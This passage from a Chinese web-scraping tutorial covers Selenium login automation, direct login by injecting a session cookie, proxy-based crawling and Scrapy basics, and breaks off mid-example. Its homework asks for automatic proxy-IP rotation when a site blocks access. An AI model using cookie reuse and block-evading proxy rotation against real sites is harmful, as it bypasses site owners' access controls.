<pre class="src src-html">&lt;<span style="color: #0000ff;">form</span> <span style="color: #a0522d;">action</span>=<span style="color: #8b2252;">"login.php"</span> <span style="color: #a0522d;">method</span>=<span style="color: #8b2252;">"post"</span>&gt;

&lt;<span style="color: #0000ff;">fieldset</span>&gt;

        &lt;<span style="color: #0000ff;">label</span> <span style="color: #a0522d;">for</span>=<span style="color: #8b2252;">"user"</span>&gt;Username&lt;/<span style="color: #0000ff;">label</span>&gt; &lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text"</span> <span style="color: #a0522d;">class</span>=<span style="color: #8b2252;">"loginInput"</span> <span style="color: #a0522d;">size</span>=<span style="color: #8b2252;">"20"</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"username"</span>&gt;&lt;<span style="color: #0000ff;">br</span> /&gt;


        &lt;<span style="color: #0000ff;">label</span> <span style="color: #a0522d;">for</span>=<span style="color: #8b2252;">"pass"</span>&gt;Password&lt;/<span style="color: #0000ff;">label</span>&gt; &lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"password"</span> <span style="color: #a0522d;">class</span>=<span style="color: #8b2252;">"loginInput"</span> <span style="color: #a0522d;">AUTOCOMPLETE</span>=<span style="color: #8b2252;">"off"</span> <span style="color: #a0522d;">size</span>=<span style="color: #8b2252;">"20"</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"password"</span>&gt;&lt;<span style="color: #0000ff;">br</span> /&gt;

        &lt;<span style="color: #0000ff;">br</span> /&gt;

        &lt;<span style="color: #0000ff;">p</span> <span style="color: #a0522d;">class</span>=<span style="color: #8b2252;">"submit"</span>&gt;&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"submit"</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"Login"</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"Login"</span>&gt;&lt;/<span style="color: #0000ff;">p</span>&gt;

&lt;/<span style="color: #0000ff;">fieldset</span>&gt;

&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">'hidden'</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">'user_token'</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">'e5613bb5b3a6f6dcb472f690239ccd4b'</span> /&gt;

&lt;/<span style="color: #0000ff;">form</span>&gt;
</pre>
</div></li>

<li>通过上一步确定了具体的标签后，我们需要有以下三步动作来实现自动登录；<br>
<ol class="org-ol">
<li>通过程序定位标签；<br></li>
<li>输入账号密码；<br></li>
<li>点击登录；<br></li>
</ol></li>
</ol>

<p>
通过以上逻辑，确定自动化登录代码<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> selenium <span style="color: #a020f0;">import</span> webdriver
<span style="color: #a020f0;">from</span> selenium.webdriver.common.by <span style="color: #a020f0;">import</span> By

<span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"Start Cici Selenium Test Project...."</span>)
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35774;&#32622;User-Agent</span>
<span style="color: #a0522d;">profile</span> = webdriver.FirefoxOptions()
profile.set_preference(<span style="color: #8b2252;">"general.useragent.override"</span>,
                       <span style="color: #8b2252;">"Cici.com"</span>)

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20351;&#29992;&#28779;&#29392;&#27983;&#35272;&#22120;&#29615;&#22659;</span>
<span style="color: #a0522d;">driver</span> = webdriver.Firefox(options=profile)

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35774;&#32622;&#35775;&#38382;&#30340;&#22320;&#22336;</span>
driver.get(<span style="color: #8b2252;">"http://localhost:8080"</span>)
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20351;&#29992;XPATH&#26041;&#24335;&#33719;&#21462;html&#26631;&#31614;&#33410;&#28857;&#65292;&#27492;&#22788;&#20026;&#33719;&#21462; input &#26631;&#31614;&#20013;&#21517;&#31216;&#20026; username &#30340;&#33410;&#28857;</span>
<span style="color: #a0522d;">user_elem</span> = driver.find_element(By.XPATH, <span style="color: #8b2252;">"//input[@name='username']"</span>)
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;input&#26631;&#31614;&#65292;&#21517;&#31216;&#20026;password&#30340;&#33410;&#28857;</span>
<span style="color: #a0522d;">pass_elem</span> = driver.find_element(By.XPATH, <span style="color: #8b2252;">"//input[@name='password']"</span>)
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#28165;&#31354;&#33410;&#28857;&#40664;&#35748;&#20540;</span>
user_elem.clear()
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#28165;&#31354;&#33410;&#28857;&#40664;&#35748;&#20540;</span>
pass_elem.clear()
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35774;&#32622;username&#26631;&#31614;&#33410;&#28857;&#20869;&#23481;&#20026; admin</span>
user_elem.send_keys(<span style="color: #8b2252;">"admin"</span>)
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35774;&#32622;password&#26631;&#31614;&#33410;&#28857;&#20869;&#23481;&#20026; password</span>
pass_elem.send_keys(<span style="color: #8b2252;">"password"</span>)

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#30331;&#38470;&#25353;&#38062;&#33410;&#28857;</span>
<span style="color: #a0522d;">login_butten_elem</span> = driver.find_element(By.XPATH, <span style="color: #8b2252;">"//input[@Name='Login']"</span>)
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#28857;&#20987;&#30331;&#38470;&#25353;&#38062;</span>
login_butten_elem.click()
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25171;&#21360;User-Agent</span>
<span style="color: #483d8b;">print</span>(driver.execute_script(<span style="color: #8b2252;">"return navigator.userAgent"</span>))
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20851;&#38381;&#27983;&#35272;&#22120;&#29615;&#22659;</span>
driver.close()
</pre>
</div>

<p>
使用cookie直接登录<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> time

<span style="color: #a020f0;">from</span> selenium <span style="color: #a020f0;">import</span> webdriver

<span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"Start Cici Selenium Test Project By Use Cookie...."</span>)
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20351;&#29992;&#28779;&#29392;&#27983;&#35272;&#22120;&#29615;&#22659;</span>
<span style="color: #a0522d;">driver</span> = webdriver.Firefox()

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35774;&#32622;&#35775;&#38382;&#30340;&#22320;&#22336;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#28155;&#21152;Cookie</span>
driver.get(<span style="color: #8b2252;">"http://127.0.0.1:8080"</span>)

driver.add_cookie({
    <span style="color: #8b2252;">'name'</span>: <span style="color: #8b2252;">'PHPSESSID'</span>,
    <span style="color: #8b2252;">'value'</span>: <span style="color: #8b2252;">'qq53p7m5ppq5t6a6gmbede2f27'</span>
})

time.sleep(1)
driver.get(<span style="color: #8b2252;">"http://127.0.0.1:8080/index.php"</span>)

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20851;&#38381;&#27983;&#35272;&#22120;&#29615;&#22659;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">driver.close()</span>
</pre>
</div>

<p>
selenium 各方法含义<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&#26041;&#27861; &#25551;&#36848;
add_cookie &#23558; cookie &#28155;&#21152;&#21040;&#24403;&#21069;&#20250;&#35805;&#12290;
back &#22312;&#27983;&#35272;&#22120;&#21382;&#21490;&#20013;&#20498;&#36864;&#20102;&#19968;&#27493;&#12290;
close &#20851;&#38381;&#24403;&#21069;&#31383;&#21475;&#12290;
create_web_element &#21019;&#24314;&#20855;&#26377;&#25351;&#23450; element_id &#30340; Web &#20803;&#32032;&#12290;
delete_all_cookies &#21024;&#38500;&#20250;&#35805;&#33539;&#22260;&#20869;&#30340;&#25152;&#26377; cookie&#12290;
delete_cookie &#21024;&#38500;&#20855;&#26377;&#32473;&#23450;&#21517;&#31216;&#30340;&#21333;&#20010; cookie&#12290;
get_cookie &#25353;&#21517;&#31216;&#33719;&#21462;&#21333;&#20010; cookie&#12290; &#22914;&#26524;&#25214;&#21040;&#21017;&#36820;&#22238; cookie&#65292;&#22914;&#26524;&#27809;&#26377;&#21017;&#36820;&#22238; None&#12290;
get_cookies &#36820;&#22238;&#19968;&#32452;&#23383;&#20856;&#65292;&#23545;&#24212;&#20110;&#24403;&#21069;&#20250;&#35805;&#20013;&#21487;&#35265;&#30340; cookie&#12290;
quite &#36864;&#20986;&#39537;&#21160;&#31243;&#24207;&#24182;&#20851;&#38381;&#27599;&#20010;&#20851;&#32852;&#30340;&#31383;&#21475;&#12290;
refersh &#21047;&#26032;&#24403;&#21069;&#39029;&#38754;&#12290;
set_page_load_timeout &#35774;&#32622;&#22312;&#24341;&#21457;&#38169;&#35823;&#20043;&#21069;&#31561;&#24453;&#39029;&#38754;&#21152;&#36733;&#23436;&#25104;&#30340;&#26102;&#38388;&#37327;&#12290;
set_script_timeout &#35774;&#32622;&#33050;&#26412;&#22312; execute_async_script &#35843;&#29992;&#26399;&#38388;&#22312;&#24341;&#21457;&#38169;&#35823;&#20043;&#21069;&#24212;&#31561;&#24453;&#30340;&#26102;&#38388;&#37327;&#12290;
current_url &#33719;&#21462;&#24403;&#21069;&#39029;&#38754;&#30340; URL&#12290;
page_source &#33719;&#21462;&#24403;&#21069;&#39029;&#38754;&#30340;&#28304;&#20195;&#30721;&#12290;
title &#36820;&#22238;&#24403;&#21069;&#39029;&#38754;&#30340;&#26631;&#39064;&#12290;&#36864;&#20986;&#39537;&#21160;&#31243;&#24207;&#24182;&#20851;&#38381;&#27599;&#20010;&#20851;&#32852;&#30340;&#31383;&#21475;&#12290;
refersh &#21047;&#26032;&#24403;&#21069;&#39029;&#38754;&#12290;
set_page_load_timeout &#35774;&#32622;&#22312;&#24341;&#21457;&#38169;&#35823;&#20043;&#21069;&#31561;&#24453;&#39029;&#38754;&#21152;&#36733;&#23436;&#25104;&#30340;&#26102;&#38388;&#37327;&#12290;
set_script_timeout &#35774;&#32622;&#33050;&#26412;&#22312; execute_async_script &#35843;&#29992;&#26399;&#38388;&#22312;&#24341;&#21457;&#38169;&#35823;&#20043;&#21069;&#24212;&#31561;&#24453;&#30340;&#26102;&#38388;&#37327;&#12290;
execute_script &#25191;&#34892; js &#33050;&#26412;
</pre>
</div>

<p>
<b>爬取Key网站及链接</b><br>
</p>

<p>
代理IP获取网站<br>
<a href="https://free.kuaidaili.com/free/inha/">https://free.kuaidaili.com/free/inha/</a><br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> selenium <span style="color: #a020f0;">import</span> webdriver
<span style="color: #a020f0;">from</span> selenium.webdriver.common.by <span style="color: #a020f0;">import</span> By
<span style="color: #a020f0;">import</span> re

<span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"Start Cici Selenium Test Project...."</span>)
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35774;&#32622;&#20195;&#29702;</span>
<span style="color: #a0522d;">profile</span> = webdriver.FirefoxOptions()
profile.set_preference(<span style="color: #8b2252;">"network.proxy.type"</span>, 1)
profile.set_preference(<span style="color: #8b2252;">"network.proxy.socks"</span>, <span style="color: #8b2252;">"202.55.5.209"</span>)
profile.set_preference(<span style="color: #8b2252;">"network.proxy.socks_port"</span>, 8090)
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20351;&#29992;&#28779;&#29392;&#27983;&#35272;&#22120;&#29615;&#22659;</span>
<span style="color: #a0522d;">driver</span> = webdriver.Firefox(options=profile)
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35774;&#32622;&#35775;&#38382;&#30340;&#22320;&#22336;</span>
driver.get(<span style="color: #8b2252;">"https://www.Cici.com"</span>)
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#25152;&#26377;&#35838;&#31243;&#21015;&#34920;</span>
<span style="color: #a0522d;">Cici_reults</span> = driver.find_elements(By.XPATH, <span style="color: #8b2252;">"//section[@id='modules-28']"</span>)
<span style="color: #a020f0;">for</span> result <span style="color: #a020f0;">in</span> Cici_reults:
    <span style="color: #a0522d;">h3_results</span> = result.find_elements(By.CLASS_NAME, <span style="color: #8b2252;">'service-item-title'</span>)
    <span style="color: #a020f0;">for</span> name <span style="color: #a020f0;">in</span> h3_results:
        <span style="color: #483d8b;">print</span>(name.text)
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#39029;&#38754;&#20013;&#23384;&#22312;&#30340;&#38142;&#25509;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;a&#26631;&#31614;</span>
<span style="color: #a0522d;">Cici_link</span> = driver.find_elements(By.XPATH, <span style="color: #8b2252;">'//a'</span>)
<span style="color: #a020f0;">for</span> data <span style="color: #a020f0;">in</span> Cici_link:
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;href&#23646;&#24615;</span>
    <span style="color: #a0522d;">link</span> = data.get_attribute(<span style="color: #8b2252;">'href'</span>)
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21305;&#37197;&#22495;&#21517;&#20026;Cici.com</span>
    <span style="color: #a020f0;">if</span> re.<span style="color: #a020f0;">match</span>(<span style="color: #8b2252;">"https://[a-z]*.Cici.com"</span>, link):
        <span style="color: #483d8b;">print</span>(link)

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20851;&#38381;&#27983;&#35272;&#22120;&#29615;&#22659;</span>
driver.close()
</pre>
</div>


<p>
作业：<br>
</p>
<ol class="org-ol">
<li>爬取Key网站时，对所有爬取到的主页的链接进行去重；<br></li>
<li>当主页中链接为html页面时进行进一步爬取(获得html页面中的所有Cici域名的链接)；<br></li>
<li>输出去重后的所有链接并统计数量；<br></li>
<li>爬取代理IP列表，当网站访问被拦截时自动替换代理IP(进阶，选做)；<br></li>
</ol>
</div>
</div>
</div>
<div id="outline-container-h:3b0a00e8-50ad-4f0e-a8fd-8d50d839973e" class="outline-3">
<h3 id="h:3b0a00e8-50ad-4f0e-a8fd-8d50d839973e">scrapy框架</h3>
<div class="outline-text-3" id="text-h:3b0a00e8-50ad-4f0e-a8fd-8d50d839973e">
<p>
Scrapy是用Python实现的一个为了爬取网站数据，提取结构性数据而编写的应用框架。 可以应用在包括数据挖掘、信息处理或存储历史数据等一系列的程序中。<br>
</p>

<p>
Scrapy使用Twisted基于事件的高效异步网络框架来处理网络通信，可以加快下载速度，不用自己去实现异步框架，并且包含了各种中间件接口，可以灵活的完成各种需求。<br>
</p>
</div>
<div id="outline-container-h:f5339e67-cfb0-4e42-b8ac-3c5ba4a4cf4b" class="outline-4">
<h4 id="h:f5339e67-cfb0-4e42-b8ac-3c5ba4a4cf4b">Scrapy架构</h4>
<div class="outline-text-4" id="text-h:f5339e67-cfb0-4e42-b8ac-3c5ba4a4cf4b">
<ul class="org-ul">
<li>Scrapy Engine<br>
引擎，负责控制数据流在系统中所有组件中流动，并在相应动作发生时触发事件。 此组件相当于爬虫的“大脑”，是整个爬虫的调度中心。<br></li>
<li>调度器(Scheduler)<br>
调度器接收从引擎发送过来的request，并将他们入队，以便之后引擎请求他们时提供给引擎。<br>
初始的爬取URL和后续在页面中获取的待爬取的URL将放入调度器中，等待爬取。同时调度器会自动 <b>去除重复的URL</b> （如果特定的URL不需要去重也可以通过设置实现，如post请求的URL）<br></li>
<li>下载器(Downloader)<br>
下载器负责获取页面数据并提供给引擎，而后提供给spider。<br></li>
<li>Spiders爬虫<br>
Spider是编写的类，作用如下：<br>
<ul class="org-ul">
<li>Scrapy用户编写用于分析response并提取item(即获取到的item)<br></li>
<li>额外跟进的URL，将额外跟进的URL提交给引擎，加入到Scheduler调度器中。将每个spider负责处理一个特定(或一些)网站。<br></li>
</ul></li>
<li>Item Pipeline<br>
Item Pipeline负责处理被spider提取出来的item。典型的处理有清理、 验证及持久化(例如存取到数据库中)。<br>
当页面被爬虫解析所需的数据存入Item后，将被发送到项目管道(Pipeline)，并经过设置好次序的pipeline程序处理这些数据，最后将存入本地文件或存入数据库。<br>
类似管道 <code>$ ls | grep test</code> 。<br>
以下是item pipeline的一些典型应用：<br>
<ul class="org-ul">
<li>清理HTML数据<br></li>
<li>验证爬取的数据(检查item包含某些字段)<br></li>
<li>查重(或丢弃)<br></li>
<li>将爬取结果保存到数据库中<br></li>
</ul></li>

<li>下载器中间件(Downloader middlewares)<br>
简单讲就是自定义扩展下载功能的组件<br>
下载器中间件，是在引擎和下载器之间的特定钩子(specific hook)，处理它们之间的请求request和响应response。 它提供了一个简便的机制，通过插入自定义代码来扩展Scrapy功能。<br>
通过设置下载器中间件可以实现爬虫自动更换user-agent、IP等功能。<br></li>
<li>Spider中间件(Spider middlewares)<br>
Spider中间件，是在引擎和Spider之间的特定钩子(specific hook)，处理spider的输入(response)和输出(items或requests)。 也提供了同样的简便机制，通过插入自定义代码来扩展Scrapy功能。<br></li>
</ul>
</div>
</div>
<div id="outline-container-h:8e1b2a48-9d4a-4190-a5f8-1e4c8f7202c8" class="outline-4">
<h4 id="h:8e1b2a48-9d4a-4190-a5f8-1e4c8f7202c8">数据流(Data flow)</h4>
<div class="outline-text-4" id="text-h:8e1b2a48-9d4a-4190-a5f8-1e4c8f7202c8">
<ol class="org-ol">
<li>引擎打开一个网站(open a domain)，找到处理该网站的Spider并向该spider请求第一个（批）要爬取的URL(s)<br></li>
<li>引擎从Spider中获取到第一个要爬取的URL并加入到调度器(Scheduler)作为请求以备调度<br></li>
<li>引擎向调度器请求下一个要爬取的URL<br></li>
<li>调度器返回下一个要爬取的URL给引擎，引擎将URL通过下载中间件并转发给下载器(Downloader)<br></li>
<li>一旦页面下载完毕，下载器生成一个该页面的Response，并将其通过下载中间件发送给引擎<br></li>
<li>引擎从下载器中接收到Response，然后通过Spider中间件发送给Spider处理<br></li>
<li>Spider处理Response并返回提取到的Item及(跟进的)新的Request给引擎<br></li>
<li>引擎将Spider返回的Item交给Item Pipeline，将Spider返回的Request交给调度器<br></li>
<li>(从第二步)重复执行，直到调度器中没有待处理的request，引擎关闭<br></li>
</ol>

<p>
注意：只有当调度器中没有任何request了，整个程序才会停止执行。如果有下载失败的URL，会重新下载<br>
</p>
</div>
</div>
<div id="outline-container-h:b9cd8284-b335-4b96-a0aa-2aaa06b37aff" class="outline-4">
<h4 id="h:b9cd8284-b335-4b96-a0aa-2aaa06b37aff">安装scrapy</h4>
<div class="outline-text-4" id="text-h:b9cd8284-b335-4b96-a0aa-2aaa06b37aff">
<div class="org-src-container">
<pre class="src src-sh">&#23433;&#35013;wheel&#25903;&#25345;
$ pip install wheel

&#23433;&#35013;scrapy&#26694;&#26550;
$ pip install scrapy

window&#19979;&#65292;&#20026;&#20102;&#36991;&#20813;windows&#32534;&#35793;&#23433;&#35013;twisted&#20381;&#36182;&#65292;&#23433;&#35013;&#19979;&#38754;&#30340;&#20108;&#36827;&#21046;&#21253;
$ pip install Twisted-18.4.0-cp35-cp35m-win_amd64.whl
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">windows&#19979;&#20986;&#29616;&#22914;&#19979;&#38382;&#39064;
copying src\twisted\words\xish\xpathparser.g -&gt; build\lib.win-amd64-
3.5\twisted\words\xish
running build_ext
building <span style="color: #8b2252;">'twisted.test.raiser'</span> extension
error: Microsoft Visual C++ 14.0 is required. Get it with <span style="color: #8b2252;">"Microsoft Visual C++</span>
<span style="color: #8b2252;">Build Tools"</span>: http://landinghub.visualstudio.com/visual-cpp-build-tools

&#35299;&#20915;&#26041;&#26696;&#26159;&#65292;&#19979;&#36733;&#32534;&#35793;&#22909;&#30340;twisted&#65292;https://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted
python3.5 &#19979;&#36733; Twisted-18.4.0-cp35-cp35m-win_amd64.whl
python3.6 &#19979;&#36733; Twisted-18.4.0-cp36-cp36m-win_amd64.whl

&#23433;&#35013;twisted
$ pip install Twisted-18.4.0-cp35-cp35m-win_amd64.whl
&#20043;&#21518;&#22312;&#23433;&#35013;scrapy&#23601;&#27809;&#26377;&#20160;&#20040;&#38382;&#39064;&#20102;
</pre>
</div>

<p>
安装好，使用scrapy命令看看<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt; scrapy
Scrapy 1.5.0 - no active project
Usage:
    scrapy &lt;command&gt; [options] [args]

Available commands:
    bench Run quick benchmark test
    check Check spider contracts
    crawl Run a spider
    edit Edit spider
    fetch Fetch a URL using the Scrapy downloader
    genspider Generate new spider using pre-defined templates
    list List available spiders
    parse Parse URL (using its spider) and print the results
    runspider Run a self-contained spider (without creating a project)
    settings Get settings values
    shell Interactive scraping console
    startproject Create new project
    version Print Scrapy version
    view Open URL<span style="color: #a020f0;"> in</span> browser, as seen by Scrapy
</pre>
</div>
</div>
</div>
<div id="outline-container-h:1b8549de-8e4f-43f1-8ca6-158a323c8c7a" class="outline-4">
<h4 id="h:1b8549de-8e4f-43f1-8ca6-158a323c8c7a">一个简单的爬虫示例</h4>
<div class="outline-text-4" id="text-h:1b8549de-8e4f-43f1-8ca6-158a323c8c7a">
<p>
<b>创建爬虫</b><br>
</p>
<div class="org-src-container">
<pre class="src src-sh">mkdir scrapy_dir
<span style="color: #483d8b;">cd</span> scrapy_dir
scrapy startproject Cici
</pre>
</div>

<p>
在spiders目录下创建CiciSpider.py并写入代码<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> scrapy

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">CiciSpider</span>(scrapy.Spider):
    <span style="color: #a0522d;">name</span> = <span style="color: #8b2252;">"Cici"</span>

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">start_requests</span>(<span style="color: #a020f0;">self</span>):
        <span style="color: #a0522d;">urls</span> = [
            <span style="color: #8b2252;">'https://quotes.toscrape.com/page/1/'</span>,
            <span style="color: #8b2252;">'https://quotes.toscrape.com/page/2/'</span>,
        ]
        <span style="color: #a020f0;">for</span> url <span style="color: #a020f0;">in</span> urls:
            <span style="color: #a020f0;">yield</span> scrapy.Request(url=url, callback=<span style="color: #a020f0;">self</span>.parse)

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">parse</span>(<span style="color: #a020f0;">self</span>, response):
        <span style="color: #a0522d;">page</span> = response.url.split(<span style="color: #8b2252;">"/"</span>)[-2]
        <span style="color: #a0522d;">filename</span> = f<span style="color: #8b2252;">'quotes-</span>{page}<span style="color: #8b2252;">.html'</span>
        <span style="color: #a020f0;">with</span> <span style="color: #483d8b;">open</span>(filename, <span style="color: #8b2252;">'wb'</span>) <span style="color: #a020f0;">as</span> f:
            f.write(response.body)
        <span style="color: #a020f0;">self</span>.log(f<span style="color: #8b2252;">'Saved file </span>{filename}<span style="color: #8b2252;">'</span>)
</pre>
</div>

<p>
还可以定义一个 start_urls 变量，内容为url列表，此时会默认使用此列表调用 start_requests 方法；<br>
</p>

<p>
parse为默认回调方法，即使不指定也会自动回调。<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> scrapy

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">CiciSpider</span>(scrapy.Spider):
    <span style="color: #a0522d;">name</span> = <span style="color: #8b2252;">"Cici"</span>
    <span style="color: #a0522d;">start_urls</span> = [
        <span style="color: #8b2252;">'https://quotes.toscrape.com/page/1/'</span>,
        <span style="color: #8b2252;">'https://quotes.toscrape.com/page/2/'</span>,
    ]
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">parse</span>(<span style="color: #a020f0;">self</span>, response):
        <span style="color: #a0522d;">page</span> = response.url.split(<span style="color: #8b2252;">"/"</span>)[-2]
        <span style="color: #a0522d;">filename</span> = f<span style="color: #8b2252;">'quotes-</span>{page}<span style="color: #8b2252;">.html'</span>
        <span style="color: #a020f0;">with</span> <span style="color: #483d8b;">open</span>(filename, <span style="color: #8b2252;">'wb'</span>) <span style="color: #a020f0;">as</span> f:
            f.write(response.body)
        <span style="color: #a020f0;">self</span>.log(f<span style="color: #8b2252;">'Saved file </span>{filename}<span style="color: #8b2252;">'</span>)
</pre>
</div>

<ul class="org-ul">
<li><a href="https://docs.scrapy.org/en/latest/topics/spiders.html#scrapy.Spider.name">name</a> : 标识爬虫。 肯定是 在一个项目中是唯一的，即不能为不同的名称设置相同的爬虫名称。<br></li>
<li><a href="https://docs.scrapy.org/en/latest/topics/spiders.html#scrapy.Spider.start_requests">start_requests()</a> ：必须返回一个可迭代的请求。<br></li>
<li><a href="https://docs.scrapy.org/en/latest/topics/spiders.html#scrapy.Spider.parse">parse()</a> : 将被调用来处理的方法为每个请求下载的响应。 响应参数 是一个实例 <a href="https://docs.scrapy.org/en/latest/topics/request-response.html#scrapy.http.TextResponse">TextResponse</a> 持有 页面内容，并有更多有用的方法来处理它。<br>
这 parse() 方法通常解析响应，提取 将抓取的数据作为 dicts 并找到新的 URL 关注并创建新请求（Request ） 从他们。<br></li>
</ul>

<p>
<b>运行爬虫</b><br>
</p>

<p>
在项目根目录下运行<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">scrapy crawl Cici
</pre>
</div>

<p>
运行之后能够看到项目根目录下有两个下载好的文件。<br>
</p>

<p>
<b>提取数据</b><br>
</p>

<p>
使用命令<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">scrapy shell <span style="color: #8b2252;">"https://quotes.toscrape.com/page/1/"</span>
</pre>
</div>

<p>
之后会进入一个交互式shell，可以通过各种方法操纵返回数据<br>
</p>
<div class="org-src-container">
<pre class="src src-python">&gt;&gt;&gt; response.css(<span style="color: #8b2252;">'title'</span>) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#36820;&#22238;&#19968;&#20010; Selector &#23545;&#35937;</span>
[&lt;Selector xpath=<span style="color: #8b2252;">'descendant-or-self::title'</span> data=<span style="color: #8b2252;">'&lt;title&gt;Quotes to Scrape&lt;/title&gt;'</span>&gt;]

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;title&#30340;&#20869;&#23481;</span>
&gt;&gt;&gt; response.css(<span style="color: #8b2252;">'title::text'</span>).getall()
[<span style="color: #8b2252;">'Quotes to Scrape'</span>]

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#19981;&#25351;&#23450; ::text &#20250;&#33719;&#21462;&#25972;&#20010;&#26631;&#31614;</span>
&gt;&gt;&gt;response.css(<span style="color: #8b2252;">'title'</span>).getall()
[<span style="color: #8b2252;">'&lt;title&gt;Quotes to Scrape&lt;/title&gt;'</span>]

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20351;&#29992;&#27491;&#21017;&#34920;&#36798;&#24335;&#21305;&#37197;</span>
&gt;&gt;&gt; response.css(<span style="color: #8b2252;">'title::text'</span>).re(r<span style="color: #8b2252;">'Quotes.*'</span>)
[<span style="color: #8b2252;">'Quotes to Scrape'</span>]

&gt;&gt;&gt; response.css(<span style="color: #8b2252;">'title::text'</span>).re(r<span style="color: #8b2252;">'Q\w+'</span>)
[<span style="color: #8b2252;">'Quotes'</span>]
&gt;&gt;&gt; response.css(<span style="color: #8b2252;">'title::text'</span>).re(r<span style="color: #8b2252;">'(\w+) to (\w+)'</span>)
[<span style="color: #8b2252;">'Quotes'</span>, <span style="color: #8b2252;">'Scrape'</span>]
</pre>
</div>

<p>
除了 CSS ，Scrapy 选择器还支持使用 XPath 表达式：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; response.xpath(<span style="color: #8b2252;">'//title'</span>)
[&lt;Selector <span style="color: #a0522d;">xpath</span>=<span style="color: #8b2252;">'//title'</span> <span style="color: #a0522d;">data</span>=<span style="color: #8b2252;">'&lt;title&gt;Quotes to Scrape&lt;/title&gt;'</span>&gt;]

&gt;&gt;&gt; response.xpath(<span style="color: #8b2252;">'//title/text()'</span>).get()
<span style="color: #8b2252;">'Quotes to Scrape'</span>
</pre>
</div>

<p>
<b>获取其它标签内容</b><br>
</p>

<p>
<a href="https://quotes.toscrape.com">https://quotes.toscrape.com</a> 页面代码<br>
</p>
<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">class</span>=<span style="color: #8b2252;">"quote"</span>&gt;
  &lt;<span style="color: #0000ff;">span</span> <span style="color: #a0522d;">class</span>=<span style="color: #8b2252;">"text"</span>&gt;&#8220;The world as we have created it is a process of our
    thinking. It cannot be changed without changing our thinking.&#8221;&lt;/<span style="color: #0000ff;">span</span>&gt;
  &lt;<span style="color: #0000ff;">span</span>&gt;
    by &lt;<span style="color: #0000ff;">small</span> <span style="color: #a0522d;">class</span>=<span style="color: #8b2252;">"author"</span>&gt;<span style="color: #000000; background-color: #ffffff;">Albert Einstein</span>&lt;/<span style="color: #0000ff;">small</span>&gt;
    &lt;<span style="color: #0000ff;">a</span> <span style="color: #a0522d;">href</span>=<span style="color: #8b2252;">"/author/Albert-Einstein"</span>&gt;(about)&lt;/<span style="color: #0000ff;">a</span>&gt;
  &lt;/<span style="color: #0000ff;">span</span>&gt;
  &lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">class</span>=<span style="color: #8b2252;">"tags"</span>&gt;
    Tags:
